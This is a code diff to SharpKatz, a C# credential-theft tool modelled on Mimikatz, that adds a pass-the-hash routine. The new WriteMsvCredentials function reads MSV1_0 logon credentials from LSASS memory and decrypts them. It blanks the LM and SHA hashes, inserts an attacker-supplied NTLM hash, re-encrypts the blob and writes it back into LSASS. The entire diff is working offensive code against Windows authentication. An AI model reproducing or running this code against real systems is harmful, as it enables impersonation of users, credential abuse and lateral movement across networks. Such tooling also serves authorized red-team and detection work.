@@ -12,6 +12,7 @@ using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
+using static SharpKatz.Module.Pth;
 using static SharpKatz.Win32.Natives;
 
 namespace SharpKatz.Module
@@ -146,8 +147,8 @@ namespace SharpKatz.Module
             public UNICODE_STRING Password;
         }
 
-        const int LM_NTLM_HASH_LENGTH = 16;
-        const int SHA_DIGEST_LENGTH = 20;
+        public const int LM_NTLM_HASH_LENGTH = 16;
+        public const int SHA_DIGEST_LENGTH = 20;
 
         [StructLayout(LayoutKind.Sequential)]
         public struct MSV1_0_PRIMARY_CREDENTIAL
@@ -303,6 +304,99 @@ namespace SharpKatz.Module
                 }
 
             } 
+
+            return 0;
+        }
+
+        public static int WriteMsvCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist, ref SEKURLSA_PTH_DATA pthData)
+        {
+
+            foreach (Logon logon in logonlist)
+            {
+                LUID lu = pthData.LogonId;
+                if (pthData.LogonId.HighPart == logon.LogonId.HighPart && pthData.LogonId.LowPart == logon.LogonId.LowPart)
+                {
+                    IntPtr lsasscred = logon.pCredentials;
+                    LUID luid = logon.LogonId;
+                    if (lsasscred != IntPtr.Zero)
+                    {
+
+                        KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
+
+                        while (lsasscred != IntPtr.Zero)
+                        {
+                            byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS))));
+
+                            IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
+                            IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));
+
+                            lsasscred = pPrimaryCredentials;
+                            while (lsasscred != IntPtr.Zero)
+                            {
+                                byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS))));
+                                primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
+                                primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
+                                primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));
+
+                                if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
+                                {
+
+                                    byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, (ulong)primaryCredentials.Credentials.MaximumLength);
+
+                                    byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);
+
+                                    msvDecryptedCredentialsBytes[oshelper.IsShaOwPasswordOffset] = Convert.ToByte(false);
+                                    msvDecryptedCredentialsBytes[oshelper.IsLmOwfPasswordOffset] = Convert.ToByte(false);
+                                    msvDecryptedCredentialsBytes[oshelper.IsIsoOffset] = Convert.ToByte(false);
+
+                                    byte[] zeroLM = new byte[LM_NTLM_HASH_LENGTH];
+                                    byte[] zeroSHA = new byte[SHA_DIGEST_LENGTH];
+
+                                    if (oshelper.IsDPAPIProtectedOffset != 0)
+                                    {
+                                        msvDecryptedCredentialsBytes[oshelper.IsDPAPIProtectedOffset] = Convert.ToByte(false);
+                                        Array.Copy(zeroLM, 0, msvDecryptedCredentialsBytes, oshelper.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH);
+                                    }
+
+                                    Array.Copy(zeroLM, 0, msvDecryptedCredentialsBytes, oshelper.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH);
+                                    Array.Copy(zeroSHA, 0, msvDecryptedCredentialsBytes, oshelper.ShaOwPasswordOffset, SHA_DIGEST_LENGTH);
+
+                                    if (pthData.NtlmHash != null)
+                                    {
+                                        msvDecryptedCredentialsBytes[oshelper.IsNtOwfPasswordOffset] = Convert.ToByte(true);
+                                        Array.Copy(pthData.NtlmHash, 0, msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH);
+                                    }
+                                    else
+                                    {
+                                        msvDecryptedCredentialsBytes[oshelper.IsNtOwfPasswordOffset] = Convert.ToByte(false);
+                                        Array.Copy(zeroLM, 0, msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH);
+                                    }
+
+                                    byte[] msvEncryptedCredentialsBytes = BCrypt.EncryptCredentials(msvDecryptedCredentialsBytes, iv, aeskey, deskey);
+
+                                    Console.Write("[*]  \\_ msv1_0   - data copy @ {0:X} : ", primaryCredentials.Credentials.Buffer.ToInt64());
+                                    pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, primaryCredentials.Credentials.Buffer, msvEncryptedCredentialsBytes);
+
+                                    if (pthData.isReplaceOk)
+                                    {
+                                        Console.WriteLine(" OK !");
+                                        return 0;
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine(" Error replacing credential");
+                                        return 1;
+                                    }
+
+                                }
+                                lsasscred = primaryCredentials.next;
+                            }
+                            lsasscred = pNext;
+                        }
+                    }
+                }
+
+            }
 
             return 0;
         }
